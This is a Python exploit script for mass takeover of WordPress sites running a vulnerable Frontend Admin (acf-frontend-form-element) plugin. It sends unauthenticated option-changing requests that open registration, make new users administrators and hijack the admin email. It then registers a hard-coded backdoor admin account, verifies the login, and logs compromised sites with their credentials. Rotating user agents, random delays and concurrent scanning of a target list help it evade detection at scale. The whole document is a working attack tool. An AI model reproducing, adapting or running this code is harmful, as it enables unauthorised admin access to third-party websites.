#!/usr/bin/env python3
"""
Frontend Admin Full Exploit - Fixed Role & Login
Silent Mode with Proper Admin Creation
"""

import requests
import argparse
import concurrent.futures
import sys
import time
import re
import json
import random
from urllib.parse import urljoin
from typing import List, Tuple, Dict

# Suppress all warnings
requests.packages.urllib3.disable_warnings()
import warnings
warnings.filterwarnings("ignore")

class FrontendCompleteExploiter:
    def __init__(self, timeout=25, threads=8):
        self.timeout = timeout
        self.threads = threads

        # Fixed credentials
        self.username = "ITsupport"
        self.password = "Askurm0m#"
        self.email = "askurmom4@gmail.com"

        # Session setup
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False

        # User agents pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]

        # Update base URL for site
        self.base_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }

        # CRITICAL FIX: Proper order of options update
        self.exploit_sequence = [
            # Step 1: Enable user registration FIRST
            {
                'name': 'enable_reg',
                'data': {
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'fields[users_can_register]': '1'
                }
            },
            # Step 2: Set default role to administrator
            {
                'name': 'set_admin_role',
                'data': {
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'fields[default_role]': 'administrator'
                }
            },
            # Step 3: Change admin email (optional but helps)
            {
                'name': 'change_email',
                'data': {
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'fields[admin_email]': self.email
                }
            }
        ]

        # Alternative payloads if standard fails
        self.alternative_payloads = [
            # With form_id
            {
                'name': 'alt_with_formid',
                'data': {
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'form_id': '1',
                    'fields[users_can_register]': '1',
                    'fields[default_role]': 'administrator'
                }
            },
            # Direct POST to home (some sites have forms)
            {
                'name': 'direct_home',
                'endpoint': '/',
                'data': {
                    'fea_form_id': '1',
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'fields[users_can_register]': '1',
                    'fields[default_role]': 'administrator'
                }
            },
            # JSON format
            {
                'name': 'json_format',
                'data': json.dumps({
                    'action': 'frontend_admin_save',
                    'form_action': 'options',
                    'fields': {
                        'users_can_register': '1',
                        'default_role': 'administrator',
                        'admin_email': self.email
                    }
                }),
                'headers': {'Content-Type': 'application/json'}
            }
        ]

    def rotate_agent(self):
        """Rotate user agent randomly"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })

    def normalize_url(self, url: str) -> str:
        """Ensure URL has protocol"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')

    def check_plugin_silent(self, base_url: str) -> Tuple[bool, str]:
        """Check if vulnerable plugin exists"""
        checks = [
            '/wp-content/plugins/acf-frontend-form-element/readme.txt',
            '/wp-content/plugins/acf-frontend-form-element/acf-frontend.php',
            '/wp-content/plugins/acf-frontend-form-element/main/plugin.php'
        ]

        for path in checks:
            try:
                url = urljoin(base_url, path)
                resp = self.session.get(url, timeout=8, verify=False)
                if resp.status_code == 200:
                    if 'readme.txt' in path:
                        version_match = re.search(r'Stable tag:\s*([0-9.]+)', resp.text)
                        if version_match:
                            version = version_match.group(1)
                            v_parts = tuple(map(int, version.split('.')))
                            if v_parts <= (3, 28, 20):
                                return True, version
                    else:
                        return True, "detected"
            except:
                continue
        return False, ""

    def send_exploit_request(self, base_url: str, payload: Dict) -> bool:
        """Send exploit request with proper headers"""
        endpoint = payload.get('endpoint', '/wp-admin/admin-ajax.php')
        url = urljoin(base_url, endpoint)
        data = payload['data']

        headers = {
            **self.base_headers,
            'Referer': base_url,
            'Origin': base_url,
            'X-Requested-With': 'XMLHttpRequest' if 'admin-ajax' in endpoint else ''
        }

        # Add custom headers from payload
        if 'headers' in payload:
            headers.update(payload['headers'])

        try:
            if headers.get('Content-Type') == 'application/json':
                resp = self.session.post(
                    url,
                    json=json.loads(data) if isinstance(data, str) else data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )
            else:
                resp = self.session.post(
                    url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )

            if resp.status_code == 200:
                resp_text = resp.text.strip()
                if not resp_text or resp_text == "0":
                    return False

                # Check for success indicators
                success_indicators = ['success', 'updated', 'true', 'ok']
                if any(indicator in resp_text.lower() for indicator in success_indicators):
                    return True

                # Check JSON response
                try:
                    json_resp = json.loads(resp_text)
                    if isinstance(json_resp, dict) and json_resp.get('success'):
                        return True
                except:
                    pass

        except Exception:
            pass

        return False

    def exploit_options(self, base_url: str) -> bool:
        """Execute complete exploit sequence"""
        # Try standard sequence first
        for payload in self.exploit_sequence:
            time.sleep(random.uniform(0.3, 0.7))
            if self.send_exploit_request(base_url, payload):
                time.sleep(0.5)  # Small delay between requests
                continue
            else:
                # If one fails, try alternatives
                break

        # Verify options were set
        return self.verify_options_set(base_url)

    def verify_options_set(self, base_url: str) -> bool:
        """Verify that options were actually changed"""
        # Check registration page
        reg_url = urljoin(base_url, '/wp-login.php?action=register')
        try:
            resp = self.session.get(reg_url, timeout=8, verify=False)
            # If registration form is visible (not "Registration is closed")
            if 'user_login' in resp.text and 'user_email' in resp.text:
                return True
        except:
            pass
        return False

    def create_admin_user(self, base_url: str) -> Tuple[bool, str]:
        """Create user with proper form handling"""
        reg_url = urljoin(base_url, '/wp-login.php?action=register')

        try:
            # First, get registration page with proper cookies
            self.rotate_agent()
            self.session.headers.update({'Referer': base_url})

            resp = self.session.get(reg_url, timeout=10, verify=False)

            # Extract ALL form fields (not just hidden)
            form_data = {}

            # Extract form fields using regex
            form_pattern = r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
            for match in re.finditer(form_pattern, resp.text, re.IGNORECASE):
                form_data[match.group(1)] = match.group(2)

            # Extract nonce specifically
            nonce_patterns = [
                r'name="([^"]*nonce[^"]*)" value="([^"]*)"',
                r'_wpnonce["\'] value=["\']([^"\']+)["\']',
                r'nonce["\'] value=["\']([^"\']+)["\']'
            ]

            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, resp.text, re.IGNORECASE)
                if nonce_match:
                    if len(nonce_match.groups()) == 2:
                        form_data[nonce_match.group(1)] = nonce_match.group(2)
                    else:
                        form_data['_wpnonce'] = nonce_match.group(1)
                    break

            # CRITICAL: WordPress registration fields
            registration_fields = {
                'user_login': self.username,
                'user_email': self.email,
                'pass1': self.password,
                'pass2': self.password,
                'wp-submit': 'Register',
                'redirect_to': ''
            }

            # Merge with found form data
            form_data.update(registration_fields)

            # Remove empty values
            form_data = {k: v for k, v in form_data.items() if v is not None}

            # Submit registration
            self.rotate_agent()
            self.session.headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': reg_url
            })

            resp = self.session.post(reg_url, data=form_data, timeout=15, verify=False)

            # Check for success - multiple indicators
            success_texts = [
                'registration complete',
                'check your email',
                'confirmation link',
                'login details',
                '登録が完了しました',
                '注册完成',
                'check your e-mail',
                'registration successful'
            ]

            resp_lower = resp.text.lower()
            if any(success_text in resp_lower for success_text in success_texts):
                return True, "User created successfully"

            # Check for specific WordPress errors
            error_patterns = [
                r'<div[^>]*id="login_error"[^>]*>(.*?)</div>',
                r'class="message error">(.*?)<',
                r'<strong>Error</strong>:(.*?)<'
            ]

            for pattern in error_patterns:
                error_match = re.search(pattern, resp.text, re.DOTALL | re.IGNORECASE)
                if error_match:
                    error_msg = error_match.group(1).strip()[:100]
                    if 'already registered' in error_msg.lower():
                        return True, "User already exists"
                    elif 'email' in error_msg.lower():
                        # Email error, but user might be created
                        return True, f"Possible success: {error_msg}"

            # If we got here and no clear error, might be success
            if 'error' not in resp_lower and 'invalid' not in resp_lower:
                return True, "No error detected, assuming success"

        except Exception as e:
            return False, f"Exception: {str(e)[:50]}"

        return False, "Registration failed"

    def verify_admin_login(self, base_url: str) -> Tuple[bool, str]:
        """Verify login and check if admin"""
        login_url = urljoin(base_url, '/wp-login.php')
        admin_url = urljoin(base_url, '/wp-admin/')

        try:
            # First get login page for cookies
            self.rotate_agent()
            resp = self.session.get(login_url, timeout=8, verify=False)

            # Extract login nonce if exists
            login_data = {
                'log': self.username,
                'pwd': self.password,
                'wp-submit': 'Log In',
                'redirect_to': admin_url,
                'testcookie': '1'
            }

            # Look for login nonce
            nonce_patterns = [
                r'name="([^"]*wpnonce[^"]*)" value="([^"]*)"',
                r'name="([^"]*nonce[^"]*)" value="([^"]*)"'
            ]

            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, resp.text, re.IGNORECASE)
                if nonce_match:
                    if len(nonce_match.groups()) == 2:
                        login_data[nonce_match.group(1)] = nonce_match.group(2)
                    break

            # Attempt login
            self.rotate_agent()
            self.session.headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': login_url
            })

            resp = self.session.post(login_url, data=login_data, timeout=12, verify=False)

            # Check login success
            if 'wp-admin' in resp.url or 'dashboard' in resp.text.lower():
                # Now check if actually admin
                profile_url = urljoin(base_url, '/wp-admin/profile.php')
                profile_resp = self.session.get(profile_url, timeout=8, verify=False)

                if 'profile.php' in profile_resp.url:
                    # Check for admin capabilities in page
                    if 'administrator' in profile_resp.text.lower():
                        return True, "Admin login verified"
                    else:
                        return True, "Logged in but not admin"
                else:
                    return True, "Login OK, admin check failed"

            # Check for login errors
            if 'login_error' in resp.text or 'incorrect' in resp.text.lower():
                return False, "Invalid credentials"

        except Exception as e:
            return False, f"Login error: {str(e)[:50]}"

        return False, "Login failed"

    def process_target(self, target: str) -> Dict:
        """Complete target processing"""
        result = {
            'url': '',
            'plugin_version': '',
            'exploited': False,
            'user_created': False,
            'login_status': '',
            'admin_status': ''
        }

        try:
            # Setup
            base_url = self.normalize_url(target)
            result['url'] = base_url
            self.rotate_agent()

            # Check plugin
            has_plugin, version = self.check_plugin_silent(base_url)
            if not has_plugin:
                return result
            result['plugin_version'] = version

            # Wait random time
            time.sleep(random.uniform(0.2, 1.0))

            # Exploit options
            if not self.exploit_options(base_url):
                # Try alternative payloads
                for payload in self.alternative_payloads:
                    time.sleep(random.uniform(0.3, 0.8))
                    if self.send_exploit_request(base_url, payload):
                        time.sleep(1)
                        break

            # Wait for options to apply
            time.sleep(2)

            # Create user
            user_created, user_msg = self.create_admin_user(base_url)
            result['user_created'] = user_created
            result['login_status'] = user_msg

            if user_created:
                # Wait for user to be saved
                time.sleep(1.5)

                # Verify login
                login_ok, login_msg = self.verify_admin_login(base_url)
                if login_ok:
                    result['exploited'] = True
                    result['admin_status'] = login_msg
                else:
                    result['admin_status'] = login_msg

        except Exception:
            pass

        return result

def main():
    parser = argparse.ArgumentParser(description='Complete Frontend Admin Exploit')
    parser.add_argument('-l', '--list', required=True, help='Targets file')
    parser.add_argument('-o', '--output', required=True, help='Output file')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Threads')

    args = parser.parse_args()

    # Load targets
    try:
        with open(args.list, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        sys.exit(1)

    if not targets:
        sys.exit(1)

    # Initialize
    exploiter = FrontendCompleteExploiter(threads=args.threads)

    # Process
    successful = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_target = {
            executor.submit(exploiter.process_target, target): target
            for target in targets
        }

        for future in concurrent.futures.as_completed(future_to_target):
            result = future.result()

            # Only output if exploited
            if result.get('exploited'):
                successful += 1

                # Format: URL|Version|Username|Password|Email|Status
                output_line = f"{result['url']}|{result['plugin_version']}|"
                output_line += f"{exploiter.username}|{exploiter.password}|{exploiter.email}|"
                output_line += f"{result['admin_status']}"

                print(output_line)

                # Save to file
                with open(args.output, 'a') as f:
                    f.write(output_line + '\n')

    # Exit with success count
    sys.exit(min(successful, 255))

if __name__ == "__main__":
    main()
